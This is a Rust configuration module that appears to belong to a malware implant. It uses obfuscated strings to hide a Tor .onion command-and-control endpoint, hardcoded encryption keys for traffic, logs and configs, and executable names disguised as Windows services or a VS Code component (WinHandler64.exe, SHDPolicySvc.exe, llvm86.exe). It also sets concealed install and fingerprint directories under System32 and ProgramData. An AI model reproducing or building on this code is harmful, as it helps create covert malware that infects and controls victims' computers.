use std::path::PathBuf;
use obfstr::obfstr as s;
use crate::utils::functions::{ programdata_dir, system32_dir };

pub fn get_mib_config_path() -> PathBuf {
    system32_dir().join(s!("mib.xml"))
}

pub fn onion_endpoint() -> String {
    s!("vlq52sx7fsnvtm7uwf3blypxiats67qnwn3wymexo7vdkili7k7brgid.onion").to_owned()
}
pub fn communication_encryption_key() -> String {
    s!("5Csdf6sdf6sdf345dmf6asd41cvElac0").to_owned()
}
pub fn logs_encryption_key() -> String {
    s!("logs_enc87_key_d3p4F3a515nmG_8xE").to_owned()
}
pub fn configs_encryption_key() -> String {
    s!("35G8Rf4M6s4d13amjydsIB4141dXML0").to_owned()
}
pub fn client_exe_name() -> String {
    s!("WinHandler64.exe").to_owned()
}
pub fn system_loader_exe_name() -> String {
    s!("SHDPolicySvc.exe").to_owned()
}
pub fn vscode_initial_loader_exe_name() -> String {
    s!("llvm86.exe").to_owned()
}
pub fn get_fingerprint_dir() -> PathBuf {
    programdata_dir().join(s!("cwl")).join(s!("reg.1de4eec8-1241"))
}
pub fn get_initial_install_dir() -> PathBuf {
    programdata_dir().join(s!("cwl")).join(s!("shaders"))
}
pub fn get_loader_install_lock_dir() -> PathBuf {
    programdata_dir().join(s!("s82vQh")).join(s!("Local"))
}
